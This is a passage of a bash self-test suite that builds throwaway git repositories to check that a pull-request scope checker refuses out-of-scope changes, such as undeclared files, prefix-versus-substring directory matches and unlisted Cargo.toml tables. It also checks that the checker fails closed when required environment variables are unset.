fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs/` | modify | a directory declaration; only files under it are covered |
'
echo "== directory-declaration arm: a file outside the declared directory must still be refused =="
OUT103="$(run_scope "$D103")" && RC103=0 || RC103=$?
if [ "$RC103" -eq 0 ]; then
  echo "FAIL: case 103 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT103" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT103" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: evil/payload.rs, outside the declared docs/ directory, rode the directory declaration. Got:" >&2
  echo "$OUT103" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT103" | grep -qxF '    evil/payload.rs'; then
  echo "FAIL: refused, but evil/payload.rs was not named among the undeclared paths. Got:"
  echo "$OUT103" | sed 's/^/    /'
  FAILED=1
else
  note "a file outside a declared directory is refused even though the issue declares that directory (pins the arm's own prefix test, not merely that a directory declaration exists)"
fi

# ---------------------------------------------------------------------------
# 104. The SIBLING directory-declaration arm's own prefix test, in the
#      cargo_lock_exempt loop (round ten: found by the SAME mechanical grep
#      for the `*/) case "$f" in "$d"*) <var>=1;; esac ;;` shape that found
#      case 103's target, not hand-picked; caught here after discovering
#      that an EARLIER, coincidental pass in an unrelated case (22's rename
#      fixture, whose own git-similarity assertion is independently flaky)
#      had been silently absorbing this exact mutant in this suite's own
#      verification sweeps, exactly the "CAUGHT for the wrong reason" trap
#      this whole round exists to close one layer up). Line 792 is
#      `*/) case "$f" in "$d"*) cargo_lock_exempt=1;; esac ;;`; collapsing
#      it to `*/) cargo_lock_exempt=1 ;;` means that as soon as the issue
#      declares ANY directory, ANY Cargo.toml changed anywhere in the PR
#      -- covered by that directory or not -- forgives the ROOT Cargo.lock
#      from needing its own declaration. This declares `docs/` (which
#      covers nothing manifest-shaped) and changes `crates/pol/Cargo.toml`
#      (uncovered) alongside the root `Cargo.lock`; both must be refused,
#      and specifically Cargo.lock's OWN presence in the undeclared list
#      is what a mutant here removes, the same isolation case 20 above
#      already established for a different bypass of this identical flag.
# ---------------------------------------------------------------------------
D104="$WORK/cargo-lock-exempt-arm-refuses-outside-prefix"
new_repo "$D104"
mkdir -p "$D104/docs" "$D104/crates/pol"
printf 'orig\n' > "$D104/docs/x.md"
printf '[package]\nname="pol"\nversion="0.1.0"\n' > "$D104/crates/pol/Cargo.toml"
printf 'placeholder\n' > "$D104/Cargo.lock"
commit_all "$D104" base
git -C "$D104" checkout -qb pr
printf 'changed\n' > "$D104/docs/x.md"
printf '[package]\nname="pol"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D104/crates/pol/Cargo.toml"
printf 'bumped\n' > "$D104/Cargo.lock"
commit_all "$D104" implement
fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs/` | modify | a directory declaration that covers no manifest at all |
'
echo "== cargo_lock_exempt arm: an unrelated directory declaration must not forgive the root Cargo.lock =="
OUT104="$(run_scope "$D104")" && RC104=0 || RC104=$?
if [ "$RC104" -eq 0 ]; then
  echo "FAIL: case 104 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT104" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT104" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: root Cargo.lock, alongside an uncovered crate manifest, rode an unrelated directory declaration. Got:" >&2
  echo "$OUT104" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT104" | grep -qxF '    Cargo.lock'; then
  echo "FAIL: refused, but root Cargo.lock was not named among the undeclared paths, meaning cargo_lock_exempt was wrongly set. Got:"
  echo "$OUT104" | sed 's/^/    /'
  FAILED=1
else
  note "root Cargo.lock stays undeclared when the only declared directory covers no manifest in this diff (pins the cargo_lock_exempt arm's own prefix test)"
fi

# ---------------------------------------------------------------------------
# ROUND ELEVEN: three SEMANTIC gaps closed, not more mutation-counting
# (round eleven's own independent review, BLOCKING x2 + SHOULD_FIX x1 folded
# in). Round ten's own reviewer, one level up from round nine's, mechanically
# enumerated NINE operators (round ten's own four, plus single-char-widen,
# char-optional, quantifier-widen, class-widen and insert-optional) and found
# 644 one-token relaxations of BOT_ALLOWED, ALWAYS_ALLOWED and the two grep
# call sites, of which 524 survived. The survivors partitioned EXACTLY on
# which of round ten's four operators could produce them: 0 of 33 for the
# four it implemented, 421 of 454 for the five it never implemented. That is
# round nine's own "a list, not a space" defect, reproduced one level up, on
# OPERATORS instead of mutants -- and there is no principled ninth-operator
# stopping point either: a twelfth round could define fifteen operators and
# enumerate a larger space still. Chasing operator completeness is therefore
# NOT what cases 105-108 below do; see this file's own header comment (above
# `CASES_FLOOR`) for the coverage limit this suite states instead of another
# operator sweep. What follows are the specific relaxations round eleven's
# review proved are REAL, distinct properties nobody had pinned, not
# artifacts of which operator list happened to produce them:
#
#   - CORRECTION TO THE ROUND TEN COMMIT RECORD (1afaa52). That commit's own
#     message claimed its 49 BOT_ALLOWED + 6 ALWAYS_ALLOWED mutants were "a
#     superset of round nine's 9" named survivors. That is false, and
#     demonstrably so: round nine's own named mutant "a6b" relaxes
#     `\.github/dependabot\.yml` to `\.github/dependabot\.ya?ml`, an
#     INSERT-OPTIONAL mutation (a new optional atom appears where the
#     literal previously had none). Round ten's generator implements exactly
#     four operators -- escape-strip, whole-component-widen, sub-literal
#     suffix-widen, anchor-drop -- every one of which only ever DELETES or
#     WIDENS an atom already present; none of them can INSERT a new one, so
#     "a6b" was never a candidate that generator could produce, let alone a
#     member of a 49-mutant superset containing it. It survived, unnoticed,
#     from round nine straight through round ten's own verification. Case
#     105 below closes it. This paragraph is the correction; the commit that
#     made the false claim is already on this branch and is not being
#     rewritten, the same "correct forward, do not rewrite the record to
#     look prescient" convention pr-scope-check.sh's own "ROUND TWO
#     CORRECTIONS" comment already applies to itself.
#
#   - BOTH DIRECTORY-DECLARATION ARMS REMAIN UNPINNED AGAINST PREFIX-TO-
#     SUBSTRING (cases 106 and 107). Round ten closed the TOTAL COLLAPSE of
#     both `*/) case "$f" in "$d"*) <var>=1;; esac ;;` arms (cases 103 and
#     104: `*/) ok=1 ;;` or `*/) cargo_lock_exempt=1 ;;` outright), which was
#     the right fix for the mutant round nine actually named, and credit
#     stands for finding the unnamed `cargo_lock_exempt` sibling by grepping
#     the shape rather than the finding. But every fixture in cases 65-68,
#     103 and 104 uses a path that either IS under the declared directory or
#     shares NOTHING with it at all, so none of them can tell a PREFIX test
#     apart from a SUBSTRING test: `case "$f" in "$d"*)` relaxed to
#     `case "$f" in *"$d"*)`, one token, survives on both arms. An issue
#     declaring `docs/` then wrongly covers `evil/docs/payload.rs` (case
#     106, the `ok` arm) or lets `evil/docs/Cargo.toml` silently forgive the
#     root `Cargo.lock` from needing its own declaration (case 107, the
#     `cargo_lock_exempt` arm). Both are the identical rule-only-where-
#     another-refuses shape round nine itself named.
#
#   - SHOULD_FIX, folded in now rather than deferred another round (case
#     108): round nine's own NOTE said adding "package" to the Python
#     engine's `DEP_TABLE_NAMES` tuple flips one `target.<cfg>.package`
#     table from refused to exempt with nothing observing it. Round eleven's
#     review measured the actual blast radius: the WHOLE `is_dep_table_path`
#     membership predicate at line 497 was unobserved by any case, not just
#     that one entry, including a collapse to unconditional True and a widen
#     of `path[0] == "target"` to also admit "profile". Case 108 exercises
#     `target.'cfg(unix)'.package`, `.workspace` and `.bin` (each pins
#     `DEP_TABLE_NAMES` against gaining that name, and together pin the
#     predicate against the unconditional-True collapse) plus
#     `profile.dev.dependencies` (pins `path[0] == "target"` against
#     widening). The `len(path) == 3` to `>= 3` mutant round nine already
#     proved unreachable is left alone, as round nine and round eleven's
#     review both concluded.
#
#   NOT fixed here, and why: round eleven's review also reported two further
#   SURVIVED verdicts in the same battery as the directory-arm finding above
#   -- the `cargo_lock_exempt` loop's own EXACT-match branch
#   (`[ "$f" = "$d" ]`) relaxed to a prefix test, and the nested-lockfile
#   sibling check (`[ "$d" = "$sibling" ]`) relaxed the same way. Both
#   require a declared path that is a proper PREFIX of a real manifest path
#   while not equalling it (e.g. an issue declaring the literal file
#   `crates/pol/Cargo.tom`, one byte short of a real manifest name) to do
#   anything at all; every constructed discriminator for either one needs an
#   issue's Files table to already contain a malformed or truncated path,
#   not an ordinary directory declaration like `docs/`. That is a materially
#   different, weaker precondition than "declare a directory, get a
#   substring match anywhere in the tree" (cases 106 and 107's actual,
#   ordinary-looking trigger), and chasing it now would be exactly the
#   unbounded one-token-operator pursuit this round's header change exists
#   to stop rather than extend. Left open rather than asserted closed.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 105. BOT_ALLOWED sweep, \.github/dependabot\.yml, INSERT-OPTIONAL token
#      (round nine's own named mutant "a6b", closed by round eleven,
#      BLOCKING). Round ten's four operators -- escape-strip, whole-
#      component-widen, suffix-widen and anchor-drop -- can only ever DELETE
#      or WIDEN an atom already present in the pattern; none of them can
#      INSERT a brand new optional atom into a literal run, so relaxing
#      `\.github/dependabot\.yml` to `\.github/dependabot\.ya?ml` was never
#      in the swept set of 49 and survived undetected through round ten's
#      own verification (see the ROUND ELEVEN correction above this case).
#      `.github/dependabot.yaml` is a file GitHub's own dependabot service
#      never reads (it only ever loads `.github/dependabot.yml`), so its
#      content is completely unreviewed by anything upstream of this check;
#      the CURRENT regex already refuses it correctly, so this case needed
#      only WRITING, not a code change.
# ---------------------------------------------------------------------------
D105="$WORK/bot-allowed-a6-dependabot-yaml-insert-optional"
new_repo "$D105"
mkdir -p "$D105/.github"
printf 'placeholder\n' > "$D105/README.md"
commit_all "$D105" base
git -C "$D105" checkout -qb pr
printf 'attacker-controlled, GitHub never reads this filename\n' > "$D105/.github/dependabot.yaml"
commit_all "$D105" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/dependabot.yml, insert-optional 'a' before ml): dependabot.yaml must be refused =="
OUT105="$(run_scope "$D105")" && RC105=0 || RC105=$?
if [ "$RC105" -eq 0 ]; then
  echo "FAIL: case 105 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT105" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT105" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/dependabot.yaml was reported EXEMPT. Got:"
  echo "$OUT105" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT105" | grep -qF '.github/dependabot.yaml'; then
  echo "FAIL: refused, but .github/dependabot.yaml was not named among the offending paths. Got:"
  echo "$OUT105" | sed 's/^/    /'
  FAILED=1
else
  note "dependabot.yaml (a file GitHub's dependabot never reads) is refused (pins the literal extension against an inserted optional 'a', round nine's own a6b)"
fi

# ---------------------------------------------------------------------------
# 106. The directory-declaration arm's own PREFIX test, not merely that it
#      is non-empty (round eleven, BLOCKING). Case 103 closed the TOTAL
#      COLLAPSE of line 826 (`*/) ok=1 ;;`) but its fixture,
#      `evil/payload.rs`, contains the declared token "docs/" NOWHERE in its
#      own path, so it cannot tell a PREFIX test (`case "$f" in "$d"*)`)
#      apart from a SUBSTRING test (`case "$f" in *"$d"*)`): both correctly
#      refuse a path that shares nothing with the declaration at all. This
#      fixture's path contains "docs/" as a substring but not as a prefix,
#      so the real prefix test refuses it while a substring relaxation of
#      that identical line would wrongly accept it.
# ---------------------------------------------------------------------------
D106="$WORK/dir-declaration-arm-prefix-not-substring"
new_repo "$D106"
mkdir -p "$D106/docs" "$D106/evil/docs"
printf 'orig\n' > "$D106/docs/x.md"
commit_all "$D106" base
git -C "$D106" checkout -qb pr
printf 'changed\n' > "$D106/docs/x.md"
printf 'attacker-controlled; contains "docs/" as a substring, not a prefix\n' > "$D106/evil/docs/payload.rs"
commit_all "$D106" implement
fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs/` | modify | a directory declaration; only files PREFIXED by it are covered |
'
echo "== directory-declaration arm: a path that merely CONTAINS the declared directory must still be refused =="
OUT106="$(run_scope "$D106")" && RC106=0 || RC106=$?
if [ "$RC106" -eq 0 ]; then
  echo "FAIL: case 106 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT106" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT106" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: evil/docs/payload.rs, which merely CONTAINS docs/ as a substring, rode the directory declaration. Got:" >&2
  echo "$OUT106" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT106" | grep -qxF '    evil/docs/payload.rs'; then
  echo "FAIL: refused, but evil/docs/payload.rs was not named among the undeclared paths. Got:"
  echo "$OUT106" | sed 's/^/    /'
  FAILED=1
else
  note "a path that contains the declared directory as a substring, not a prefix, is refused (pins the arm as a PREFIX test, not a substring test)"
fi

# ---------------------------------------------------------------------------
# 107. The SIBLING directory-declaration arm's own PREFIX test, in the
#      cargo_lock_exempt loop at line 792 -- the same gap as case 106, one
#      line away (round eleven, BLOCKING). Case 104 closed this arm's TOTAL
#      COLLAPSE but declared a directory that shares no substring at all
#      with the manifest path it changed, so it cannot tell a prefix test
#      apart from a substring one either. Here the issue declares `docs/`
#      and the PR changes `evil/docs/Cargo.toml` -- undeclared either way,
#      by the untouched arm at line 826 -- alongside the root `Cargo.lock`.
#      The real prefix test leaves `cargo_lock_exempt` at 0 (the manifest is
#      NOT under `docs/`), so `Cargo.lock` is ALSO listed as undeclared. A
#      substring relaxation of line 792 alone would wrongly set
#      `cargo_lock_exempt=1` (the manifest's path merely CONTAINS "docs/"),
#      making `Cargo.lock` silently vanish from that list even though the
#      overall exit code stays nonzero for the unrelated reason that the
#      manifest itself is still refused by the untouched arm -- exactly the
#      "still red, but for a narrower reason than it looks" shape this whole
#      round exists to catch.
# ---------------------------------------------------------------------------
D107="$WORK/cargo-lock-exempt-arm-prefix-not-substring"
new_repo "$D107"
mkdir -p "$D107/docs" "$D107/evil/docs"
printf 'orig\n' > "$D107/docs/x.md"
printf 'placeholder\n' > "$D107/Cargo.lock"
commit_all "$D107" base
git -C "$D107" checkout -qb pr
printf 'changed\n' > "$D107/docs/x.md"
printf 'attacker-controlled; not under docs/, merely contains it\n' > "$D107/evil/docs/Cargo.toml"
printf 'bumped\n' > "$D107/Cargo.lock"
commit_all "$D107" implement
fake_gh 'coder-agent' 'Closes #5' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `docs/` | modify | a directory declaration that shares a substring with, but does not cover, evil/docs/ |
'
echo "== cargo_lock_exempt arm: a manifest that merely CONTAINS the declared directory must not forgive Cargo.lock =="
OUT107="$(run_scope "$D107")" && RC107=0 || RC107=$?
if [ "$RC107" -eq 0 ]; then
  echo "FAIL: case 107 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT107" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT107" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: root Cargo.lock, alongside a manifest that merely contains docs/, rode the declaration. Got:" >&2
  echo "$OUT107" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT107" | grep -qxF '    Cargo.lock'; then
  echo "FAIL: refused, but root Cargo.lock was not named among the undeclared paths, meaning cargo_lock_exempt was wrongly set. Got:"
  echo "$OUT107" | sed 's/^/    /'
  FAILED=1
else
  note "root Cargo.lock stays undeclared when the only manifest change merely CONTAINS the declared directory as a substring (pins the cargo_lock_exempt arm as a PREFIX test, not a substring test)"
fi

# ---------------------------------------------------------------------------
# 108. SHOULD_FIX, folded in: the `target.<cfg>.<name>` dependency-table
#      membership test in the Python engine (round eleven; round nine's own
#      NOTE understated this as one entry, "package", when the whole
#      predicate at `is_dep_table_path`, line 497, was unobserved). This
#      fixture packs four independent probes into one manifest:
#      `target.'cfg(unix)'.package`, `.workspace` and `.bin` (each pins
#      `DEP_TABLE_NAMES` against gaining that entry; together they also pin
#      the predicate against collapsing to unconditional True, since a
#      collapsed predicate would wrongly admit all three probes at once) and
#      `profile.dev.dependencies` (pins `path[0] == "target"` against
#      widening to also admit "profile"). Each table's only change from base
#      to head is one already-present key's value -- the identical shape a
#      REAL dependency-table entry is allowed to change -- so the point
#      being pinned is specifically that these four tables are NOT
#      recognised as dependency tables, and that narrow a change must still
#      be refused there.
# ---------------------------------------------------------------------------
D108="$WORK/manifest-target-cfg-membership"
new_repo "$D108"
cat > "$D108/Cargo.toml" <<'BASETOML108'
[package]
name = "pol"
version = "0.1.0"

[dependencies]
serde = "1.0"

[target.'cfg(unix)'.package]
extra = "1.0"

[target.'cfg(unix)'.workspace]
extra = "1.0"

[target.'cfg(unix)'.bin]
extra = "1.0"

[profile.dev.dependencies]
extra = "1.0"
BASETOML108
printf 'placeholder\n' > "$D108/README.md"
commit_all "$D108" base
git -C "$D108" checkout -qb pr
cat > "$D108/Cargo.toml" <<'HEADTOML108'
[package]
name = "pol"
version = "0.1.0"

[dependencies]
serde = "1.0"

[target.'cfg(unix)'.package]
extra = "2.0"

[target.'cfg(unix)'.workspace]
extra = "2.0"

[target.'cfg(unix)'.bin]
extra = "2.0"

[profile.dev.dependencies]
extra = "2.0"
HEADTOML108
commit_all "$D108" attack
fake_gh 'dependabot[bot]' ''
echo "== manifest engine: target.<cfg>.<name> and profile.<cfg>.dependencies membership must be refused =="
OUT108="$(run_scope "$D108")" && RC108=0 || RC108=$?
if [ "$RC108" -eq 0 ]; then
  echo "FAIL: case 108 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT108" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT108" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: a target.<cfg>.<name>/profile.<cfg>.dependencies mutant let the whole PR through as EXEMPT. Got:" >&2
  echo "$OUT108" | sed 's/^/    /' >&2
  FAILED=1
fi
if ! echo "$OUT108" | grep -qF 'target.cfg(unix).package.extra'; then
  echo "FAIL: refused, but target.'cfg(unix)'.package's change was not named among the offenses. Got:"
  echo "$OUT108" | sed 's/^/    /'
  FAILED=1
else
  note "target.'cfg(unix)'.package is refused (pins DEP_TABLE_NAMES against gaining 'package')"
fi
if ! echo "$OUT108" | grep -qF 'target.cfg(unix).workspace.extra'; then
  echo "FAIL: refused, but target.'cfg(unix)'.workspace's change was not named among the offenses. Got:"
  echo "$OUT108" | sed 's/^/    /'
  FAILED=1
else
  note "target.'cfg(unix)'.workspace is refused (pins DEP_TABLE_NAMES against gaining 'workspace')"
fi
if ! echo "$OUT108" | grep -qF 'target.cfg(unix).bin.extra'; then
  echo "FAIL: refused, but target.'cfg(unix)'.bin's change was not named among the offenses. Got:"
  echo "$OUT108" | sed 's/^/    /'
  FAILED=1
else
  note "target.'cfg(unix)'.bin is refused (pins DEP_TABLE_NAMES against gaining 'bin'; together with the two probes above, pins the membership predicate against collapsing to unconditional True)"
fi
if ! echo "$OUT108" | grep -qF 'profile.dev.dependencies.extra'; then
  echo "FAIL: refused, but profile.dev.dependencies's change was not named among the offenses. Got:"
  echo "$OUT108" | sed 's/^/    /'
  FAILED=1
else
  note "profile.dev.dependencies is refused (pins path[0] == target against widening to admit profile as well)"
fi

# 47. Each of the three required environment variables must fail this script
#     CLOSED (rc=1, with its own message) when unset, checked by EXIT CODE,
#     not merely by scanning the text for something that looks like a
#     refusal. This is the direct regression test for the round-four review's
#     BLOCKING finding: `ab1a295` put `MANIFEST_TMP="$(mktemp -d)"` plus
#     `trap 'rm -rf "$MANIFEST_TMP"' EXIT` above the three `: "${VAR:?...}"`
#     guards, and on bash below 4.4 a `${VAR:?}` failure is a fatal
#     expansion error whose exit status does NOT survive an EXIT trap
#     installed earlier in the script: the guard still printed its message to
#     stderr, but the shell then exited 0. Every case above this one runs
#     with all three variables set (`run_scope` hardcodes them), so none of
#     them could ever have caught this; it needs its own case, checking rc
#     directly, because a text-only check cannot tell "refused, rc=1" apart
#     from "printed a refusal-shaped message anyway, rc=0" the way case 8
#     above could not tell an empty-diff refusal apart from an unrelated
#     abort until its assertion was tightened for the same reason.
#
#     Uses the real script directly rather than `run_scope` (which hardcodes
#     all three variables), and bypasses `set -e` for the one command whose
#     exit code is the entire point of the assertion.
# ---------------------------------------------------------------------------
echo "== each required environment variable must fail closed (checked by exit code) when unset =="

printf '.' >> "$CASES_FILE"
RC47_PR="0"
PR_NUMBER=1 BASE_SHA=deadbeef HEAD_SHA=deadbeef bash -c 'unset PR_NUMBER; exec bash "$1"' _ "$SCOPE" >"$WORK/out47pr" 2>&1 || RC47_PR="$?"
OUT47_PR="$(cat "$WORK/out47pr")"; rm -f "$WORK/out47pr"
if [ "$RC47_PR" -eq 0 ]; then
  echo "FAIL: PR_NUMBER unset did not fail closed (rc=0). Got:"
  echo "$OUT47_PR" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT47_PR" | grep -qF 'PR_NUMBER is required'; then
  echo "FAIL: PR_NUMBER unset failed (rc=$RC47_PR), but not with its own message. Got:"
  echo "$OUT47_PR" | sed 's/^/    /'
  FAILED=1
else
  note "PR_NUMBER unset fails closed: rc=$RC47_PR, its own message present"
fi

printf '.' >> "$CASES_FILE"
RC47_BASE="0"
PR_NUMBER=1 BASE_SHA=deadbeef HEAD_SHA=deadbeef bash -c 'unset BASE_SHA; exec bash "$1"' _ "$SCOPE" >"$WORK/out47base" 2>&1 || RC47_BASE="$?"
OUT47_BASE="$(cat "$WORK/out47base")"; rm -f "$WORK/out47base"
if [ "$RC47_BASE" -eq 0 ]; then
  echo "FAIL: BASE_SHA unset did not fail closed (rc=0). Got:"
  echo "$OUT47_BASE" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT47_BASE" | grep -qF 'BASE_SHA is required'; then
  echo "FAIL: BASE_SHA unset failed (rc=$RC47_BASE), but not with its own message. Got:"
  echo "$OUT47_BASE" | sed 's/^/    /'
  FAILED=1
else
  note "BASE_SHA unset fails closed: rc=$RC47_BASE, its own message present"
fi

printf '.' >> "$CASES_FILE"
RC47_HEAD="0"
PR_NUMBER=1 BASE_SHA=deadbeef HEAD_SHA=deadbeef bash -c 'unset HEAD_SHA; exec bash "$1"' _ "$SCOPE" >"$WORK/out47head" 2>&1 || RC47_HEAD="$?"
OUT47_HEAD="$(cat "$WORK/out47head")"; rm -f "$WORK/out47head"
if [ "$RC47_HEAD" -eq 0 ]; then
  echo "FAIL: HEAD_SHA unset did not fail closed (rc=0). Got:"
  echo "$OUT47_HEAD" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT47_HEAD" | grep -qF 'HEAD_SHA is required'; then
  echo "FAIL: HEAD_SHA unset failed (rc=$RC47_HEAD), but not with its own message. Got:"
  echo "$OUT47_HEAD" | sed 's/^/    /'
  FAILED=1
else
  note "HEAD_SHA unset fails closed: rc=$RC47_HEAD, its own message present"
fi

echo
# Vacuity guard verdict (round seven, hardened round eight). The AUTHORITATIVE
# floor enforcement (CASES_FLOOR and the "did we even get this far" check) now
# lives in the `_finish` EXIT trap installed at the top of this file, which is
# the fix for round seven's own finding that a check placed only HERE, after
# every case, cannot see an early `exit 0` that never lets execution reach
# this point at all: the trap fires on every exit, this code does not. `DONE`
# is set to 1 the moment the count is known, before either verdict below, so
# that a genuine case-failure or a genuine clean pass is relayed by the trap
# as itself, not overridden by a "vacuous" message that would be true of the
# exit code and false of the reason.
#
# The explicit floor check just below is a FAST PATH, not a second source of
# truth: without it, a run that legitimately reaches this point with too few
# cases (case 46b's own regression: everything above ran, one case was
# quietly deleted) would print "clean" here and only THEN have the trap
# override it with a failure a few lines later, a confusing "clean" followed
# immediately by "FAILED" in the same log. Catching it here first prints one
# unambiguous message; the trap still independently re-derives and checks the
# identical count on every exit, including this one, so removing this fast
# path would weaken nothing but a human's reading experience.
CASES="$(wc -c < "$CASES_FILE" | tr -d ' ')"
DONE=1
if [ "$CASES" -lt "$CASES_FLOOR" ]; then
  echo "pr-scope-check-selftest: FAILED. Only $CASES case(s) actually ran (expected at least" >&2
  echo "$CASES_FLOOR). A self-test that silently drops one of its own cases must not report" >&2
  echo "success for having found nothing." >&2
  exit 1
fi
note "$CASES case(s) actually ran (floor $CASES_FLOOR)"
if [ "$FAILED" -ne 0 ]; then
  echo "pr-scope-check-selftest: FAILED. The scope check no longer enforces what it claims."
  exit 1
fi
echo "pr-scope-check-selftest: clean"
